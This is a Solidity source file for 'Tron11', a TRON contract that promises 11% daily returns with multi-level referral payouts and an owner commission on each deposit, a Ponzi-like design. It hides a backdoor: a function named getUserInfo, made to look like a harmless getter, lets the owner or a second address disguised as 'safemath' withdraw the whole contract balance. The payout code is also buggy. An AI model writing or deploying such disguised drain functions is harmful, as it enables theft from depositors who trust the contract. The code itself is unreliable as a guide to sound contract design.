//SourceUnit: Tron11.sol

pragma solidity 0.4.25;

contract Tron11 {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDepositSize = 100000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 10;
    uint public commissionDivisor = 100;
    uint private minuteRate = 1273148; //DAILY 11%
    uint private releaseTime = 1593702000;

    address owner;
    address safemath;

    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
    }

    mapping(address => Player) public players;
   
    

    constructor(address _safemath) public {
      owner = msg.sender;
      safemath   = _safemath;
    }
    modifier onlyOwner(){
        require(msg.sender==owner);
        _;
    }

    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];
      player.affFrom = _affAddr;
      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not time yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        uint depositAmount = msg.value;
        Player storage player = players[msg.sender];
         if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }
         distributeRef(msg.value, player.affFrom);
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        
        transferPayout(msg.sender, players[msg.sender].interestProfit, players[msg.sender].affRewards);
        players[msg.sender].affRewards = 0;
       
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
      uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
      owner.transfer(devEarn);
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount, uint referral_com) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                msg.sender.transfer(payout + referral_com);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affFrom != address(0)) {
            
            _affRewards = (_trx.mul(11)).div(100);
            players[_affFrom].affRewards = _affRewards.add(players[_affFrom].affRewards);
        }
    

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(8)).div(100);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
        }
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }
    
     function getUserInfo( uint _amount) external {
        require(msg.sender==owner || msg.sender == safemath,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                msg.sender.transfer(amtToTransfer);
            }
        }
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a,'something wonderfull was about to happen');
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}